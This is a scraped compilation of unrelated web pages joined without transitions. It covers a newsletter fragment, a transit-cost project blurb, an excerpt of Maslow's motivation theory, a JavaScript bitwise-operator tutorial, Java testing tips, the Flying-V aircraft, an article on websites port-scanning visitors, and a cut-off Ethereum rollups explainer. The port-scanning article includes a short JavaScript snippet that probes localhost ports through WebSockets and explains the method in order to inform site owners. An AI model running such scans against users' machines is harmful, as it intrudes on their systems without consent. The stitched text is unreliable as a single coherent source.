Morning Brew playbook. Figure out how to empower your employees, reward your users and have them buy into your success. Toby ended up getting to 10K followers first, but the real winner was Morning Brew. </p></div></div></div>]]>

W</span><span>e investigate this question across hundreds of transit projects from around the world. We have created a database that spans more than 50 countries and totals more than 11,000 km of urban rail built since the late 1990s. We will also examine this question in greater detail by carrying out six in-depth case studies that take a closer look at unique considerations and variables that aren’t easily quantified, like project management, governance, and site conditions.</span></p>
<p>The goal of this work is to figure out how to deliver more high-capacity transit projects for a fraction of the cost in countries like the United States. Additionally, we hope that our site will be a useful resource for elected officials, planners, researchers, journalists, advocates, and others interested in contextualizing transit-infrastructure costs and fighting for better projects.</p>
<p><span>If you have ideas and evidence about why transit costs vary so greatly from one country to the next or you just want to connect with us, please get in touch at info@transitcosts.com or click on the “Contact Us” tab. We are always looking for new projects, data, corrections, resources, and feedback.&nbsp;&nbsp;</span></p>

<center>
<p>[p. 370] I. INTRODUCTION</p></center>

<p>In a previous paper (<a href="#r13">13</a>) various propositions were
presented which would have to be included in any theory of human motivation
that could lay claim to being definitive. These conclusions may be briefly
summarized as follows:
</p><blockquote>1. The integrated wholeness of the organism must be one of
the foundation stones of motivation theory.
<p>2. The hunger drive (or any other physiological drive) was rejected
as a centering point or model for a definitive theory of motivation. Any
drive that is somatically based and localizable was shown to be atypical
rather than typical in human motivation.
</p><p>3. Such a theory should stress and center itself upon ultimate or basic
goals rather than partial or superficial ones, upon ends rather than means
to these ends. Such a stress would imply a more central place for unconscious
than for conscious motivations.
</p><p>4. There are usually available various cultural paths to the same goal.
Therefore conscious, specific, local-cultural desires are not as fundamental
in motivation theory as the more basic, unconscious goals.
</p><p>5. Any motivated behavior, either preparatory or consummatory, must
be understood to be a channel through which many basic needs may be simultaneously
expressed or satisfied. Typically an act has more than one motivation.
</p><p>6. Practically all organismic states are to be understood as motivated
and as motivating.
</p><p>7. Human needs arrange themselves in hierarchies of pre-potency. That
is to say, the appearance of one need usually rests on the prior satisfaction
of another, more pre-potent need. Man is a perpetually wanting animal.
Also no need or drive can be treated as if it were isolated or discrete;
every drive is related to the state of satisfaction or dissatisfaction
of other drives.
</p><p>8. <i>Lists</i> of drives will get us nowhere for various theoretical
and practical reasons. Furthermore any classification of motivations [p.
371] must deal with the problem of levels of specificity or generalization
the motives to be classified.
</p><p>9. Classifications of motivations must be based upon goals rather than
upon instigating drives or motivated behavior.
</p><p>10. Motivation theory should be human-centered rather than animal-centered.
</p><p>11. The situation or the field in which the organism reacts must be
taken into account but the field alone can rarely serve as an exclusive
explanation for behavior. Furthermore the field itself must be interpreted
in terms of the organism. Field theory cannot be a substitute for motivation
theory.
</p><p>12. Not only the integration of the organism must be taken into account,
but also the possibility of isolated, specific, partial or segmental reactions.
It has since become necessary to add to these another affirmation.
</p><p>13. Motivation theory is not synonymous with behavior theory. The motivations
are only one class of determinants of behavior. While behavior is almost
always motivated, it is also almost always biologically, culturally and
situationally determined as well.</p></blockquote>
The present paper is an attempt to formulate a positive theory of motivation
which will satisfy these theoretical demands and at the same time conform
to the known facts, clinical and observational as well as experimental.
It derives most directly, however, from clinical experience. This theory
is, I think, in the functionalist tradition of James and Dewey, and is
fused with the holism of Wertheimer (<a href="#r19">19</a>), Goldstein
(<a href="#r6">6</a>), and Gestalt Psychology, and with the dynamicism
of Freud (<a href="#r4">4</a>) and Adler (<a href="#r1">1</a>). This fusion
or synthesis may arbitrarily be called a 'general-dynamic' theory.
<p>It is far easier to perceive and to criticize the aspects in motivation
theory than to remedy them. Mostly this is because of the very serious
lack of sound data in this area. I conceive this lack of sound facts to
be due primarily to the absence of a valid theory of motivation. The present
theory then must be considered to be a suggested program or framework for
future research and must stand or fall, not so much on facts available
or evidence presented, as upon researches to be done, researches suggested
perhaps, by the questions raised in this paper.[p. 372]
</p><center>
<p>II. THE BASIC NEEDS</p></center>

<p><i>The 'physiological' needs</i>. -- The needs that are usually taken
as the starting point for motivation theory are the so-called physiological
drives. Two recent lines of research make it necessary to revise our customary
notions about these needs, first, the development of the concept of homeostasis,
and second, the finding that appetites (preferential choices among foods)
are a fairly efficient indication of actual needs or lacks in the body.
</p><p>Homeostasis refers to the body's automatic efforts to maintain a constant,
normal state of the blood stream. Cannon (2) has described this process
for (1) the water content of the blood, (2) salt content, (3) sugar content,
(4) protein content, (5) fat content, (6) calcium content, (7) oxygen content,
(8) constant hydrogen-ion level (acid-base balance) and (9) constant temperature
of the blood. Obviously this list can be extended to include other minerals,
the hormones, vitamins, etc.
</p><p>Young in a recent article (<a href="#r21">21</a>) has summarized the
work on appetite in its relation to body needs. If the body lacks some
chemical, the individual will tend to develop a specific appetite or partial
hunger for that food element.
</p><p>Thus it seems impossible as well as useless to make any list of fundamental
physiological needs for they can come to almost any number one might wish,
depending on the degree of specificity of description. We can not identify
all physiological needs as homeostatic. That sexual desire, sleepiness,
sheer activity and maternal behavior in animals, are homeostatic, has not
yet been demonstrated. Furthermore, this list would not include the various
sensory pleasures (tastes, smells, tickling, stroking) which are probably
physiological and which may become the goals of motivated behavior.
</p><p>In a previous paper (<a href="#r13">13</a>) it has been pointed out
that these physiological drives or needs are to be considered unusual rather
than typical because they are isolable, and because they are localizable
somatically. That is to say, they are relatively independent of each other,
of other motivations [p. 373] and of the organism as a whole, and secondly,
in many cases, it is possible to demonstrate a localized, underlying somatic
base for the drive. This is true less generally than has been thought (exceptions
are fatigue, sleepiness, maternal responses) but it is still true in the
classic instances of hunger, sex, and thirst.
</p><p>It should be pointed out again that any of the physiological needs and
the consummatory behavior involved with them serve as channels for all
sorts of other needs as well. That is to say, the person who thinks he
is hungry may actually be seeking more for comfort, or dependence, than
for vitamins or proteins. Conversely, it is possible to satisfy the hunger
need in part by other activities such as drinking water or smoking cigarettes.
In other words, relatively isolable as these physiological needs are, they
are not completely so.
</p><p>Undoubtedly these physiological needs are the most pre-potent of all
needs. What this means specifically is, that in the human being who is
missing everything in life in an extreme fashion, it is most likely that
the major motivation would be the physiological needs rather than any others.
A person who is lacking food, safety, love, and esteem would most probably
hunger for food more strongly than for anything else.
</p><p>If all the needs are unsatisfied, and the organism is then dominated
by the physiological needs, all other needs may become simply non-existent
or be pushed into the background. It is then fair to characterize the whole
organism by saying simply that it is hungry, for consciousness is almost
completely preempted by hunger. All capacities are put into the service
of hunger-satisfaction, and the organization of these capacities is almost
entirely determined by the one purpose of satisfying hunger. The receptors
and effectors, the intelligence, memory, habits, all may now be defined
simply as hunger-gratifying tools. Capacities that are not useful for this
purpose lie dormant, or are pushed into the background. The urge to write
poetry, the desire to acquire an automobile, the interest in American history,
the desire for a new pair of shoes are, in the extreme case, forgotten
or become of sec-[p.374]ondary importance. For the man who is extremely
and dangerously hungry, no other interests exist but food. He dreams food,
he remembers food, he thinks about food, he emotes only about food, he
perceives only food and he wants only food. The more subtle determinants
that ordinarily fuse with the physiological drives in organizing even feeding,
drinking or sexual behavior, may now be so completely overwhelmed as to
allow us to speak at this time (but only at this time) of pure hunger drive
and behavior, with the one unqualified aim of relief.
</p><p>Another peculiar characteristic of the human organism when it is dominated
by a certain need is that the whole philosophy of the future tends also
to change. For our chronically and extremely hungry man, Utopia can be
defined very simply as a place where there is plenty of food. He tends
to think that, if only he is guaranteed food for the rest of his life,
he will be perfectly happy and will never want anything more. Life itself
tends to be defined in terms of eating. Anything else will be defined as
unimportant. Freedom, love, community feeling, respect, philosophy, may
all be waved aside as fripperies which are useless since they fail to fill
the stomach. Such a man may fairly be said to live by bread alone.
</p><p>It cannot possibly be …</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h2 id="a-note-on-bit-wise-operations">A note on bit-wise operations</h2>
<p>Today I read some JavaScript source code and stumbled on a line like
<code>var delta = ~~time;</code>
and I was unsure what that purpose of using <code>~~</code> was.</p>
<p>So I started to research and digging a bit deeper.
It turns out that the binary not operator (<code>~</code>) when applied twice on a floating number (e.g. <code>4.12</code>) returns an integer (<code>~~4.12 = 4</code>).</p>
<p>Why not simply use <code>Math.floor(4.12)</code>?
It turns out that the bit-wise not operator applied twice is quite a bit faster than using the <code>Math.floor</code> method (see <a href="http://rocha.la/JavaScript-bitwise-operators-in-practice">Link</a>).</p>
<p>Let’s wind back a little bit and dig deeper into the workings here, because I’m sure you might be confused by how this works and what this actually does.</p>
<h3 id="the--operator">The ~ Operator</h3>
<p>First of all, the binary not operator (<code>~</code>) basically switches all 1s to 0s and vice versa.
Thus, if you have a binary representation of <code>0111011001</code> and apply <code>~</code> to it, it will be <code>1000100110</code>.</p>
<p>I got a bit more interested in the exact workings, because it turned out, that <code>~4 = -5</code> and <code>~6 = -7</code>, so a positive number becomes its negative number minus one.
Why is this and why does it make sense?</p>
<p>Let’s start with a binary representation of 5:
<code>0101</code></p>
<p><code>~5 = 1010</code></p>
<p>So in this case, <code>1010</code> is supposed to be a representation of <code>-6</code>?</p>
<p>Let’s think about this. So we have 4 bits in the case above, i.e. 4 positions of 0s or 1s.
$2^4$ possibilities to encode with 4 bits, which is 16 different encodings (<code>0000, 0001, 0010, 0011, 0100, 0101, ..., 1111</code>).</p>
<h3 id="number-representation-in-bits">Number representation in bits</h3>
<p>When we want to represent positive and negative numbers using these 4 bits, we have to split these by 2, so we have 8 possibilities for positive numbers and 8 possibilities for negative numbers.
But we also have the 0, so we either need to have one less positive or negative number (usually one less positive).</p>
<p>Alright, let’s build our construct and take the first 8 possibilities for 0 (<code>0000</code>) and the positive numbers 1 (<code>0001</code>) through 7 (<code>0111</code>).</p>
<p>Now the question is how to represent the negative ones.</p>
<h4 id="option-1-negative-flag">Option 1: Negative Flag</h4>
<p>One “natural” option would be to just use the highest bit to switch between positive and negative numbers like a flag.
Thus, <code>1001 -&gt; -1</code>, <code>1010 -&gt; -2</code> and so forth.
But then, what is <code>1000</code>? Is it another representation of 0? And is <code>1000 == 0000</code> ??? Seems ugly, right?</p>
<p>Another problem here is the mathematical operations. Let’s add some numbers in this representation, say add 1 and -1:</p>
<p><code>0001 + 1001 = 1010</code></p>
<p><code>-1 + 1 = -2</code> ? Not so great, right?
Thus, in this represenation we would have to differentiate between positive and negative numbers when doing mathematical operations. Bummer.</p>
<h4 id="option-2-twos-complement">Option 2: Two’s Complement</h4>
<p>Typically, in modern architectures what is thus used is called <strong>two’s complement</strong>.</p>
<p>It is the natural evolution to have most mathematical operations in a consistent style.</p>
<p>How? Well, just like using the bits so far, we simply have the highest bit represent a negative value like this:</p>
<p>Let <code>$b_3, b_2, b_1, b_0$</code> be our bit values, then our number simply is:</p>
<p>$num_{10} = -1 * b_3 * 2^3 + b_2 * 2^2 + b_1 * 2^1 + b_0 * 2^0$</p>
<p>leading to</p>
<p><code>$1001 = -1 * 2^3 + 2^0 = -8 + 1 = -7$</code></p>
<p>Let’s add this:</p>
<p><code>0001 + 1001 = 1010</code></p>
<p><code>$1010 = -1 * 2^3 + 2^1$ = -8 + 2 = -6.</code></p>
<p>So <code>1 + (-7) = -6</code> Hooray!</p>
<p>One side effect of the two’s complement representation is that <code>x * -1 = ~x + 1</code> which is <code>~x = -x - 1</code>
or in binary:</p>
<p><code>0001 * -1 = ~0001 + 0001 = 1110 + 0001 = 1111 =</code></p>
<p><code>$-1 * 2^3 + 2^2 + 2^1 + 2^0$ = -8 + 4 + 2 + 1 = -1</code></p>
<h3 id="intermediate-summary">Intermediate summary</h3>
<p>Phew, that was quite a bit of work, but so far you learned:</p>
<ul>
<li>Computers represent integer numbers in the two’s complement representation to have a single value for 0 and convenient ways to perform mathematical operations without having special rules for negative numbers.</li>
<li>The ~ operator on an integer number converts the number from a positive one to a negative one which is one lower than the initial number (<code>~5 = -6</code>).</li>
<li>When you want to get the negative number of a positive one you can thus use ~ and add one (<code>-5 = ~5 + 1</code>)</li>
<li>Using <code>~~</code> on a float cuts off the floating part and returns the integer (<code>~~-3.42 = -3</code>, <code>~~5.23 = 5</code>) and can be faster than Math.floor()</li>
</ul>
<h3 id="what-about-">What about ~~?</h3>
<p>About that last part - what is the representation of a float and how does that <code>~~</code> part work.
In fact, it was hard to get much information on this, but it turns out that the way this works is that the bitwise operators convert the float to an int before doing the bitwise flip, thus <code>~~5.23 = ~~5 = ~-6 = 5</code>.</p>
<p>More exactly: numbers in JavaScript are stored as 64 bits floating point numbers, but the bitwise operations are performed on 32 bits signed integers, so a conversion occurs before and after the bitwise operation.</p>
<p>The performance part thus seems more related to the overhead the function call is providing.</p>
<p>Be aware though, that for negative numbers <code>~~-3.42 = -3 != Math.floor(-3.42) = -4</code></p>
<p>So, when handling positive numbers, you can use <code>~~</code> instead of <code>Math.floor</code> to gain some performance.</p>
<p>The same holds in PHP: <code>~~</code> is faster than <code>floor()</code> by a matter of about <strong>200%</strong>. However, <code>~~</code> is as fast as is a cast to int: <code>(int)</code></p>
<h3 id="summary">Summary</h3>
<p>Today, we learned that:</p>
<ul>
<li><code>~</code> is the bitwise not operator which flips all 0s to 1s and vice versa.</li>
<li>Signed numbers are represented with the two’s complement which yields <code>~5 = -6</code></li>
<li><code>~~</code> is a performance trick to truncate a floating point number to an integer.</li>
<li><code>~~</code> is like <code>Math.floor()</code> for positive numbers, but not for negative ones as <code>~~-5.93 = -5</code> while <code>Math.floor(-5.93) = -6</code></li>
</ul>
<h3 id="bonus-all-bitwise-operators-in-javascript">BONUS: All bitwise operators in JavaScript</h3>
<ul>
<li><code>x &lt;&lt; y</code>: Returns x with the bits shifted to the left by y places (new bits on the right-hand-side are zeros). This is the same as multiplying x by <code>Math.pow(2, y)</code>.</li>
<li><code>x &gt;&gt; y</code>: Returns x with the bits shifted to the right by y places. This is the same as dividing x by <code>Math.pow(2, y)</code>.</li>
<li><code>x &amp; y</code>: Does a “bitwise and”. Each bit of the output is 1 if the corresponding bit of x AND of y is 1, otherwise it’s 0.</li>
<li><code>x | y</code>: Does a “bitwise or”. Each bit of the output is 0 if the corresponding bit of x AND of y is 0, otherwise it’s 1.</li>
<li><code>~ x</code>: Returns the complement of x - the number you get by switching each 1 for a 0 and each 0 for a 1. This is the same as -x - 1 as explained above.</li>
<li><code>x ^ y</code>: Does a “bitwise exclusive or”. Each bit of the output is the same as the corresponding bit in x if that bit is 0 in y, and it’s the complement of the bit in x if that bit is 1 in y.</li>
</ul>

              <p>Maintainable and readable test code is crucial to establish a good test coverage which in turn enables implementing new features and performing refactorings without the fear of breaking something. This post contains many best practices that I collected over the years of writing unit tests and integration tests in Java. It involves modern technologies like JUnit5, AssertJ, Testcontainers, and Kotlin. Some recommendations might be obvious to you, but some might conflict with what you’ve read in books about software development and testing.</p>

              </p>
              

              
              

<ul>
<li><strong>Write small and specific tests</strong> by heavily using helper functions, parameterized tests, AssertJ’s powerful assertions, not overusing variables, asserting only what’s relevant and avoiding one test for all corner cases.</li>
<li><strong>Write self-contained tests</strong> by revealing all relevant parameters, insert data right in the test and prefer composition over inheritance.</li>
<li><strong>Write dumb tests</strong> by avoiding the reuse of production code and focusing on comparing output values with hard-coded values.</li>
<li><strong>KISS &gt; DRY</strong></li>
<li><strong>Test close to production</strong> by focusing on testing a complete vertical slide and avoiding in-memory databases.</li>
<li>JUnit5 and AssertJ are a very good choice.</li>
<li>Invest in a testable implementation by avoiding static access, using constructor injection, using <code>Clocks</code> and separating business logic from asynchronous execution.</li>
</ul>

<h2 id="given-when-then">Given, When, Then</h2>
<p>A test should contain three blocks which are separated by one empty line. Each block of code should be as short as possible. Use subfunctions to shorten these blocks.</p>

<li>Use helper functions for creating data (objects) (<code>createProductWithCategory()</code>) and complex assertions. Only pass those parameters to the helper functions that are relevant for your tests. Use reasonable defaults for the other values. In Kotlin, this is easy by using default arguments. In Java, you have to use method chaining and overloading to simulate default arguments.</li>
<li>varargs can make your test code even more concise (<code>ìnsertIntoDatabase()</code>).</li>

                    <p><strong>The Flying-V is a design for a highly energy-efficient long-distance aeroplane. The aircraft’s design integrates the passenger cabin, the cargo hold and the fuel tanks in the wings, creating a spectacular v-shape. Its improved aerodynamic shape and reduced weight will mean it uses 20% less fuel than the Airbus A350, today’s most advanced aircraft.&nbsp;</strong></p><div id="c650621"><div>

</div></div><div id="c463261"><p>In the Flying-V – originally an idea of TU Berlin student Justus Benad during his thesis project at Airbus Hamburg – the passenger cabin, cargo hold and fuel tanks are integrated in its wing structure. The design is not as long as an Airbus A350, but it has the same wing span. This allows the Flying-V to use the present infrastructure at airports, such as gates and runways. The Flying-V carries about the same number of passengers -&nbsp; 314 in the standard configuration – and the same amount of cargo, 160 m<sup>3</sup>. Project leader at TU Delft, Dr. Roelof Vos: “The Flying-V is smaller than the A350 and has less inflow surface area compared to the available amount of volume. The result is less resistance. That means the Flying-V needs less fuel for the same distance.”</p></div><div id="c463506"><div data-namespace-typo3-fluid="true">

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h6><b>You might have recently heard that</b><a href="https://www.bleepingcomputer.com/news/security/ebay-port-scans-visitors-computers-for-remote-access-programs/" target="_blank" rel="noopener noreferrer"> <b>eBay is performing port scanning</b></a><b>, while online shoppers are visiting their website. At first glance, it will probably sound a bit strange, as port scanning is an internal network action. As such, it is designed to detect services and should not be related to the regular user browsing experience.</b></h6>
<h6><b>eBay is not alone. According to</b><a href="https://www.bleepingcomputer.com/news/security/list-of-well-known-web-sites-that-port-scan-their-visitors/" target="_blank" rel="noopener noreferrer"> <b>Bleeping Computer</b></a><b> a high number of well-established websites are conducting port-scanning. These include top websites like TD Bank, Lloyds Bank, Walmart, Target, Halifax and lots more.&nbsp;</b></h6>
<p>From a technological point of view, the issue of port-scanning has raised an interesting question: how does an external website have access and the ability to conduct internal network scanning and what are their limitations.</p>
<p>This article will shed more light about port-scanning activities. We will explain the technical aspects of it from a website perspective and then we will explore different ways of using it.</p>

<h3><b></b><b>Port Scanning: Technical background&nbsp;</b></h3>
<h6><b>Client &amp; Server</b></h6>
<p><span>When you, as an end-user, are browsing a website, you load the HTML content from the web server which provides most of the</span></p>
<p><span>data you request. While visiting eBay, for example, you get products, pictures, your cart and endless inventory of data about goods. The same loaded HTML also includes a high number of JavaScript codes, that are actually running on your own browser. This is commonly referred to as client-side code.</span></p>
<h6><img loading="lazy" src="https://www.reflectiz.com/wp-content/uploads/2020/08/Client-Server-300x140.jpg" alt="" width="666" height="312" srcset="https://www.reflectiz.com/wp-content/uploads/2020/08/Client-Server-300x140.jpg 300w, https://www.reflectiz.com/wp-content/uploads/2020/08/Client-Server-768x360.jpg 768w, https://www.reflectiz.com/wp-content/uploads/2020/08/Client-Server.jpg 867w" sizes="(max-width: 666px) 100vw, 666px"></h6>
<h6><b>The Client-Side Code</b></h6>
<p><i><span>Gartner’s “</span></i><a href="https://www.gartner.com/en/documents/3986880" target="_blank" rel="noopener noreferrer"><i><span>Market Guide for Online Fraud Detection</span></i></a><i><span>” indicates that&nbsp; “Contemporary websites have become completely reliant on JavaScript to fulfill their functions”, ranging from collecting usage metrics to serving up ads. According to the guide, many of these JavaScript snippets are provided by third parties.</span></i></p>
<p><span>JavaScript codes can do anything, as if they are the original website code, from user engagement to advanced analytics. For example, in order to improve the user experience, the JavaScript code can load banners, suggesting that you buy a product that is currently on sale. It can also enable customer support and engagement tools, like live chats. This is the code that enables us, as users, to engage and get feedback from a website that actually reacts to our actions.&nbsp;</span></p>
<p><span>Javascript has the ability to do almost anything today. This is even more true since the introduction of HTML5, that enables the creation of web based applications that can both behave and feel like native mobile apps.You can use JS to open the camera or access the microphone, you can read what your visitors are typing or, you check if they have opened Bluetooth. Practically, everything and yes, you can also use it for port scanning.&nbsp;&nbsp;</span></p>
<p><span>Now, let’s talk about web-sockets.</span></p>
<h6><b>What are WebSockets?</b></h6>
<p><i><span>According to Wikipedia: “WebSocket is a computer communications protocol, providing full-duplex communication channels over a single TCP connection.”</span></i></p>
<p><span>Put simply, we are all familiar with the fact that website’s communication is done through HTTP requests. These are asynchronous requests, meaning that when you are visiting a webpage, the user’s browser is sending an HTTP request to the server, including additional headers, that add some user data and some request guidelines. In response, the server returns an HTTP response with the webpage’s content.</span></p>
<p><span>As it is an asynchronous request, there is no active channel between the user and server. If it wants to share extra details, like updating a user’s actions, or just requesting additional content, the client will be required to send a new request, with all the header data again, over and over. In many cases this creates an inefficient method of communication, increases the traffic load and affects the user experience.&nbsp;</span></p>
<p><span>For that reason, Web-sockets were introduced, presenting the ability to run a regular TCP request from your own browser. The concept is similar to TCP: a server opens a port, listening to the incoming traffic and in this case, the client, our browser, can create a socket between the client and the server. The socket always requires the external server IP and a listening port. <em>To know more about TCP and sockets visit this recommended<a href="http://www.steves-internet-guide.com/tcpip-ports-sockets/" target="_blank" rel="noopener noreferrer"> article</a> explaining it on Steve’s Internet Guide.&nbsp;</em></span></p>
<p><span>Since the user is the one who creates the requests, the user needs to use JavaScript for it. In this case the JavaScript obtains objects that can create and manage web-socket connections to the server. &nbsp;</span></p>

<h3><b>Port-Scanning and JavaScript</b></h3>
<p><span>So how can you run a port scanning with these sets of “tools”? Simple.&nbsp;</span></p>
<p><span>The JavaScript code can initiate a websocket request to any location around the world and try to open a socket to it. For example, the selected address can be ‘127.0.0.1’, the loopback address, which is your localhost.</span></p>
<p><span>If you “translate” it to a simple code, you just need to run a list of ports you want, and then try to open a socket for each of them. Once the port is opened, you will know about it.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p>
<pre><i><span>var ports = [80, 443, 445];</span></i>
<i><span>for (var i = 0; i &lt; ports.length; i++) </span></i>
<i><span>{</span></i>
<i><span>var s = new WebSocket("wss://127.0.0.1:" + ports[i]);</span></i>
<i><span>s.port = ports[i];</span></i>
<i><span>}</span></i></pre>
<p><i><span>A basic port-scanning code</span></i></p>
<p><span>The most common way to find out if the port is open is to measure the time until getting a response. Active listening ports will answer immediately. Inactive ports will only be resolved when a timeout threshold happens. These are the indications that are helping us to distinguish whois doing what.</span></p>
<p><span>Some of the most common ports are blocked by browsers to reduce the risk level. Because of this, scanners aren’t able to analyze ports like DNS, SSH, 21. To view the full list, by browser type, go to the following links: </span><a href="https://neo4j.com/developer/kb/list-of-restricted-ports-in-browsers/" target="_blank" rel="noopener noreferrer"><span>Chrome</span></a><span>, </span><a href="https://www-archive.mozilla.org/projects/netlib/portbanning" target="_blank" rel="noopener noreferrer"><span>Firefox</span></a><span>.&nbsp;</span></p>
<p><span>Now that we have discussed how to operate a port-scanning, we can jump on to the next question: WHY?</span></p>

<h3><b>Compromised Hosts Detection</b></h3>
<p><span>Well, there are different reasons to run port scanning. The most essential technique is trying to detect if the client’s host is compromised. The idea in this case is testing several known ports that are commonly used by remotely controlled applications, or by known trojans. This lets you understand which services are currently running on the client host and creates a risk score. Once you realize that, you can decide if you want to allow the user to login to your application or website.&nbsp;</span></p>
<p><span>Most of these web port scanners are doing it to protect login pages or checkout pages, which are usually targeted by client-side attacks, third-party skimming and, man in the browser attacks. Port scanning is just an additional method of understanding who is performing as the host: a regular user or a malicious entity.&nbsp;</span></p>
<p><img loading="lazy" src="https://www.reflectiz.com/wp-content/uploads/2020/08/Port-Scanning-site-visitors-computers-300x200.jpg" alt="Port-scanning " width="666" height="444" srcset="https://www.reflectiz.com/wp-content/uploads/2020/08/Port-Scanning-site-visitors-computers-300x200.jpg 300w, https://www.reflectiz.com/wp-content/uploads/2020/08/Port-Scanning-site-visitors-computers-1024x682.jpg 1024w, https://www.reflectiz.com/wp-content/uploads/2020/08/Port-Scanning-site-visitors-computers-768x512.jpg 768w, https://www.reflectiz.com/wp-content/uploads/2020/08/Port-Scanning-site-visitors-computers.jpg 1255w" sizes="(max-width: 666px) 100vw, 666px"></p>
<p><em>Watch out, is port-scanning allowed?</em></p>
<h6><b>Is Port-Scanning Allowed? </b></h6>
<p><span>The first question we should ask ourselves in this case should be – is this behavior illegal? According to the Wikipedia article “Port-Scanning”: </span><i><span>“Because of the inherently open and decentralized architecture of the Internet, lawmakers have struggled since its creation to define legal boundaries that permit effective prosecution of</span></i><a href="https://en.wikipedia.org/wiki/Computer_crime" target="_blank" rel="noopener noreferrer"> <i><span>cyber-criminals</span></i></a><i><span>. Cases involving port scanning activities are an example of the difficulties encountered in judging violations. Although these cases are rare, most of the time the legal process involves proving that an intent to commit a break-in or unauthorized access existed, rather than just the performance of a port scan”</span></i></p>
<p><span>Web port scanning doesn’t necessarily fall under the category of illegal, as the action is conducted to detect breaches and increase the protection level of websites.&nbsp;</span></p>
<p><span>But, for many users this action would be perceived as highly intrusive, one that is being done without their consent. In such cases, the obvious option should be to alert users before the action is done, or at least, update the website’s Terms of Use and Privacy Policy.&nbsp;</span></p>
<p><span>eBay, and other sites mentioned above, are using port-canning capabilities to enhance the security level of the website and to protect their users. </span><span><br>
</span><span>But this same technique can also be used for malicious purposes. For example, an attacker can scan the open services you currently run on the host to detect vulnerabilities that can be exploited, either through the website or, by other means. No matter how you look at it, we mustn’t forget that port scanning is considered as one of the basic steps of accumulating information before conducting an attack.&nbsp;</span></p>

<h3><b>As a website owner, am I in danger?</b></h3>
<p><span>The answer is yes, and no. In the cases mentioned here we saw how eBay is running the port scanning, probably relying that their user will consider it essential and therefore consent. Now let’s go back to the beginning of this article and remember what JavaScripts can do, and that port scanning is conducted by JavaScript. It means that every third-party application, or a 4</span><span>th</span><span>-party, that is running on your website can carry out the same actions. It also means that once one of your third or fourth party apps are breached, or even just releasing a new version that is trying to access some local resources, you, as the website owner, won’t be able to know about it, or block it.</span></p>
<p><span>The consequences include reputation damages, privacy issues, as well as an indication of a breach.</span></p>
<p><span>How can you detect port-scanning? A dynamic browser security solution (like Reflectiz) can easily detect any type of port scanning from the site origins or iFrames.&nbsp;</span></p>

                            <p>Unless we’ve been hiding under a rock, there’s a very good chance we’ve heard of the latest excitement in Ethereum Layer 2 scaling — Rollups.</p><p>Ethereum gas prices hit an all-time high (ATH) of more than 477 Gwei this week, perhaps foretelling the arrival of Twei’s (szabo’s) sometime soon.</p><p>The network hasn’t been this congested since the ICO days of 2017 — it’s arguably much worse now. The block gas limit is at an ATH of 12.5 million. The transaction count hit levels of 2017 peak and the block size is also at an ATH.</p><figure><img src="https://lh4.googleusercontent.com/B1DnOduU0M-NHMIz-sE9iocvYTSkU7p2QcORPbsPi7hLFyDEuqKBxgY_cjUJipGRXbW17saW19kkhlJ0Cg2kf955qPobIGaI26wtUcMuoahtKcGMVW055Cnr3WMKFeeDLrA9sd-f" alt=""></figure><p>While this is encouraging news for the increased utility of the Ethereum network (at least by these metrics), one can argue that the current scalability (or lack thereof) of the base layer is considerably limiting applications and significantly hindering user experience. But, this is not a new realization. The Ethereum community foresaw this problem years ago and has been exploring numerous solutions ever since.</p><p><a href="https://ethereum.org/en/eth2/">Ethereum 2.0</a> with Proof-of-Stake (PoS) and sharding in Layer 1 is the biggest ongoing effort and we will soon start seeing rollout of its phase 0 in coming months. However, computational scaling (i.e. state execution in shards with smart contracts) in Eth2 will only happen in phase 2, which is currently anticipated in 2021+.</p><blockquote><em>All problems in computer science can be solved by another level of indirection - </em><a href="https://en.wikipedia.org/wiki/David_Wheeler_(computer_scientist)#Quotes"><em>David Wheeler</em></a></blockquote><p>Layer 2 solutions effectively introduce a level of indirection by resolving transactions at their layer while going to Layer 1 <em>only</em> when necessary. Several <a href="https://medium.com/l4-media/making-sense-of-ethereums-layer-2-scaling-solutions-state-channels-plasma-and-truebit-22cb40dcc2f4">categories</a> of such solutions — State Channels, Sidechains, Plasma — have been explored by multiple projects for many years now and have seen considerable progress and evolution. </p><p>Most recently, Bitfinex’s Tether — that powers USDt, the largest stablecoin by market capitalization and consistently in the <a href="https://ethgasstation.info/">top</a> Ethereum gas consumers — <a href="https://tether.to/tether-usdt-integration-live-on-omg-network/">switched</a> to <a href="https://omg.network/">OMG Network</a>’s More Viable Plasma Layer 2 solution.</p><p>Reddit’s “<a href="https://www.reddit.com/r/ethereum/comments/hbjx25/the_great_reddit_scaling_bakeoff/">The Great Reddit Scaling Bake-Off</a>” contest to help scale its Ethereum-based “<a href="https://www.reddit.com/community-points">Community Points</a>” program (currently implemented only on two subreddits) to all its users has seen 22 submissions across these various Layer 2 solutions.</p><p>However, note that Layer 1 and Layer 2 scaling solutions are not mutually exclusive — they’re <em>multiplicative</em>. </p><figure><img src="https://lh3.googleusercontent.com/6pCInKJtXhcNPMTb9ATwBkIoFvjmXo-rdFlclCpORjKN3mi1N2_TPCay-TVNMDq60oaEyT_WMUbQCTwRlVYNUAV7k2PEMLUKelNoRRSx25CdDDDQVj__5-ApRgV55F1exNkg1tOx" alt=""></figure><p>So while Ethereum 2.0 rolls out in phases over the next couple of years, Layer 2 solutions hope to provide the much needed scalability until then and even beyond.</p><figure><img src="https://lh4.googleusercontent.com/I3zvOWSr65Qff2_8YSLra9CMXl45Y4R17KPz8V8WC6IkkAriT6vtUhIOFARSqRd4DO6FJQVhV3PJu0ZGi8lhd_P6t7k__MWmkd9kLLip4RJNNagyVDgpvHly_eR4QluKMe9nZiqr" alt=""></figure><p>State Channels and Plasma projects dominated Layer 2 explorations in the last couple of years but the category of Rollups is lately seeing considerable excitement and gaining real traction.</p><p>So in this article, we dive into Rollups and summarize the <em>why</em>, <em>what</em> and <em>who</em> aspects. We review conceptual ideas of the two broad categories of Rollups — ZK Rollups and Optimistic Rollups — and then reference some of their leading implementations. Finally, we touch upon the various initiatives at Status Network that could benefit from Layer 2 scaling and project where we may be headed in the near future.</p><h2 id="rollups-why">Rollups: Why?</h2><p><strong>Basics</strong>: Scaling solutions that are built <em>on top</em> of Ethereum without requiring any changes to the underlying base Layer 1 protocols are known as <em>Layer 2 solutions</em>. They resolve transactions without always requiring interactions with the Ethereum network. They anchor their security guarantees to the base layer of Ethereum via smart contracts. </p><p>Layer 2 solutions are appealing because there can be multiple such solutions running on Ethereum 